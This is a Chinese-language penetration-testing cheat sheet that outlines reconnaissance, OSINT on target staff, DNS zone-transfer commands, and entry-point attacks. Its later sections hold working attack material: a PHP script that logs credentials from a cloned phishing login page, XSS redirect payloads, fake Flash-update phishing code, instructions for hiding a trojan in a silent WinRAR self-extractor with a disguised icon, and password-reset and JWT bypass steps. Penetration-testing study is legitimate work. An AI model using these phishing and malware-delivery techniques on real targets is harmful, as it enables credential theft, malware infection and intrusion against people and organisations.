* Author:小y
* 公众号:关注安全技术
# Pentest_Note
## 信息收集
  ### Whois
    站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入
  ### 网站IP
  #### 是否存在CDN<br>
    Ping、多地ping、国外ping<br>
  #### Bypass cdn常规方式<br>
    子域名
      https://dnsdb.io/zh-cn/
    Ping根域名
    Nslookup
    Cloudflare的真实IP寻找
      http://crimeflare.org:82/cfs.html
      https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py
    查找老域名
    查找关联域名
      www.baidu.com
      www.baidu.cn
      www.baidu.org
      www.baidu.xyz等等
    信息泄露/配置文件
    Phpinfo
    网页源码
    Svn
    Github
    Shodan/fofa/zoomeye
    SSL证书记录
    https://censys.io/
    网站漏洞
      Xss
      Ssrf
      命令执行
      SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)
    DNS记录，证书记录
    设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址
    RSS订阅/邮件头
    APP反编译搜索/截取APP的请求信息
    修改hosts文件指向
  ### 域名历史IP
  https://x.threatbook.cn/
  ### 网站架构/服务器指纹/CMS识别/容器
    Whatweb
    网页源代码
    请求头/响应头
    网站底部，顶部，左上角右上角
    网站报错信息
    http://www.yunsee.cn/
    域名/install
    Firefox插件Wappalyzer
    CMS漏洞
      定位版本对应已知漏洞检查
      CMS未知漏洞挖掘
    Web容器已知漏洞(解析漏洞这种)
    显示网站使用的技术
      https://builtwith.com/
    中间件、组件
    Weblogic、tomcat、zabbix、struts、axis等
    https://github.com/FortyNorthSecurity/EyeWitness
  ### 子域名
    老站、同样架构或同源码的子站
    爆破，接口查询
      https://phpinfo.me/domain/
      https://d.chinacycc.com/index.php?m=Login&a=index
      subDomainBrute、knockpy
    OWA发现、dig adfs、dig mail
    https://dns.bufferover.run/dns?q=baidu.com
    http://api.hackertarget.com/reversedns/?q=target.com
  ### 网站使用的CMS的官方demo站
    找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。
  ### SSL证书信息
    https://crt.sh/?q=%25.target.com
    https://censys.io/certificates?q=target.com
    https://github.com/cheetz/sslScrape
  ### DNS历史解析记录
    https://dnsdumpster.com/
    https://censys.io/
    https://securitytrails.com/
    域传送漏洞检查
      Dnsenum、fierce
    http://ha.ckers.org/fierce/ 
    $ ./fierce.pl -dns example.com 
    $ ./fierce.pl –dns example.com –wordlist myWordList.txt
    >dig @ns.example.com example=.com AXFR 
    >nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
    >nslookup #进入nslookup交互模式
    >server dns.domian.com #指定dns服务器
    >ls xxx.yyy.cn #列出域信息
  ### 同服站点情况
    https://site.ip138.com/
    火狐插件flagfox,配置单击指向bing查ip对应的域名
  ### 同样架构或源码的站
  ### 网站js
    https://github.com/003random/getJS
    https://github.com/Threezh1/JSFinder
    或浏览器F12也可以看到加载的
    敏感信息、可能存在漏洞的参数等信息
    查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等
  ### 网站使用的第三方js
  ### 云信息
    Aliyun、AWS、GCP、Azure等
    查找可公开访问的实例
      https://github.com/gwen001/s3-buckets-finder
      https://github.com/nccgroup/aws-inventory
      https://github.com/jordanpotti/AWSBucketDump
  ### APP反编译
    url、js、osskey、api等信息查找
    搜集到接口该怎么做
      Fuzz常见参数
  ### C段/B段信息
    Banner、是否存在目标的后台或其他入口/其他业务系统
  ### 工具
    recon-ng,theharvester,maltego,exiftool等
    https://www.spiderfoot.net/
    https://github.com/smicallef/spiderfoot
  ### 端口对外开放情况
    Masscan、scanport等
    针对常见的那些端口的利用的常规方法
    常见的未授权访问的服务如redis，mongodb等
  ### 目录扫描/爬虫(慎用)
  ### WAF情况识别
    https://github.com/EnableSecurity/wafw00f
    做好绕过策略的计划
  ### 随手测试
    单引号
    xx.jpg/.php
    admin/123456
    万能密码
    Heartbleed漏洞
  ### 搜索引擎(Google 、Baidu、Bing等)
    Google自定义搜索引擎整合的300多个社交网站
      https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&cx=001794496531944888666:iyxger-cwug&q=%22%22
    Google自定义搜索引擎整合的文件共享网站
      https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&cx=001794496531944888666:hn5bcrszfhe&q=%22%22
    领英用户提取
      https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme
  ### Shodan/fofa/zoomeye
  ### Google dorks
     Site,filetype,intitle,inurl,intext等
  ### 信息泄露
    电话、邮箱，姓名
    目录遍历
    备份文件
      (www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip)
    .svn/.git/sql/robots/crossdomin.xml/DS_Store等
      https://github.com/lijiejie/ds_store_exp
      https://github.com/admintony/svnExploit
    若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典
    网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)
  ### 网页缓存
    http://www.cachedpages.com/
  ### 图片反查
    百度识图、googleimage、tineye
    原图查询坐标
  ### 社交
    QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛
    外网信息
    有些人喜欢把自己的生活传到外网
      推特、ins、fb等
  ### 手机号加入通讯录匹配各个APP用户信息
  ### 注册过的网站
    https://www.reg007.com/
    https://www.usersearch.org/
  ### 目标人员的兴趣、注册过的小众论坛，站点
    针对此类站点的深入
    收集到的用户名，电话等信息生成字典
  ### 邮箱搜集
    https://hunter.io/
    https://github.com/killswitch-GUI/SimplyEmail
  ### Exchange
    https://github.com/dafthack/MailSniper
  ### 验证邮箱是否存在
    https://tools.verifyemailaddress.io/
  ### 历史泄露过的密码、邮箱、手机等
    库
    https://haveibeenpwned.com/
    https://github.com/kernelmachine/haveibeenpwned
  ### Github/Gitee等代码托管平台
    https://github.com/dxa4481/truffleHog
    https://github.com/lijiejie/GitHack
    https://github.com/MiSecurity/x-patrol
    https://github.com/az0ne/Github_Nuggests
    https://github.com/mazen160/GithubCloner克隆用户的github
  ### 被入侵网址列表
    http://zone-h.org/archive
    wooyun镜像查找目标企业曾出现的漏洞
  ### GPS查询
    https://www.opengps.cn/Default.aspx
  ### 网站URL提取
    http://www.bulkdachecker.com/url-extractor/
  ### 蜜罐判断(参考一下即可)
    https://honeyscore.shodan.io/
  ### 默认密码
    https://default-password.info/
    http://routerpasswords.com
  ### 如需注册
    Sms
      https://www.materialtools.com/
      http://receivefreesms.com/
    Email
      https://10minutemail.net/
      https://zh.mytrashmailer.com/
      http://24mail.chacuo.net/enus
      https://www.linshiyouxiang.net/
    Fake id
      https://www.fakenamegenerator.com/
      http://www.haoweichi.com/
      https://www.fakeaddressgenerator.com/
  ### 企业信息
    天眼查、企查查、企业信用信息公示系统
    企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计
## 入口点
  ### win10 安装kali(wsl)
    Microsoft Store查找kali下载。
    Powershell执行
    >Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
    源设置vim /etc/apt/source.list
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
    deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
    >sudo su
    >passwd root修改root密码
    >apt-get update &apt-get upgrade 更新
    >apt-get dist-upgrade 
    >apt-get clean
    cmd>kali config --default-user root 设置默认启动用户为root
    cmd>net stop/start LxssManager重启服务
    >apt-get install metasploit-framework
    >apt install kali-linux-full 安装完整kali工具集
  ### 水坑攻击
  #### XSS克隆钓鱼
    保存js&css到服务器，登录action改为接受密码的文件action="./pass.php"
    <?php //php
      $user=$_POST['username'];
      $pass=$_POST['password'];
      $file=fopen('pass.txt','a+');
      fwrite($file,$user."|"."pass" . "\n");
      fclose($file);
      echo "<script>window.location.href=\"http://192.168.0.1\"</script>\n";
    ?>
    构造payload
    <script>window.location.href="http://192.168.0.1/login.html"</script>
    #php –S 0.0.0.0:8080 –t ./
  #### 伪造页面钓鱼
  ##### 1
    https://github.com/r00tSe7en/Fake-flash.cn
    添加xss平台模块
    window.alert = function(name){
    var iframe = document.createElement("IFRAME");
    iframe.style.display="none";
    iframe.setAttribute("src",'data:text/plain');
    document.documentElement.appendChild(iframe);
    window.frames[0].window.alert(name);
    iframe.parentNode.removeChild(iframe);
    }
    alert("您的FLASH版本过低，尝试升级后访问该页面！");
    window.location.href="http://www.flash.com";
    制作自解压捆绑
    一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级->自解压选项，设置解压路径，c:\windows\temp\，设置->解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。
    ResourceHacker修改文件图标
  #### 2
      if(empty($_COOKIE['flash'])){
	      echo '<script>alert("你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！");window.location="http://www.flash.cn.xx.com/"</script>';
	      setcookie("flash","true",time()+30*2400);
      }
  ### 对外服务攻击
  #### Web
  ##### 前端/逻辑漏洞
  ###### 注册
    任意用户注册
    可爆破用户名
    注入
    XSS
  ###### 登录
    爆破用户名，密码
    注入
    万能密码
    Xss
    Xss+Csrf
    修改返回包信息，登入他人账户
    修改cookie中的参数，如user,adminid等
  ###### 任意密码重置
    1．	重置一个账户，不发送验证码，设置验证码为空发送请求。
    2．	发送验证码，查看相应包
    3．	验证码生存期的爆破
    4．	修改相应包为成功的相应包
    5．	手工直接跳转到校验成功的界面
    6．	两个账户，重置别人密码时，替换验证码为自己正确的验证码
    7．	重置别人密码时，替换为自己的手机号
    8．	重置自己的成功时，同意浏览器重置别人的，不发验证码
    9．	替换用户名，ID，cookie，token参数等验证身份的参数
    10．	通过越权修改他人的找回信息如手机/邮箱来重置
  ###### 信息泄露
    HTML源码、JS等查看信息搜集一章
  ###### 后台
    登录参数修改为注册参数/reg、/register、/sign等
  ##### JWT攻击手法
    https://jwt.io/#debugger-io
  ###### 未校验签名
    将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求
  ###### 禁用哈希
    ![img](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/1.png)
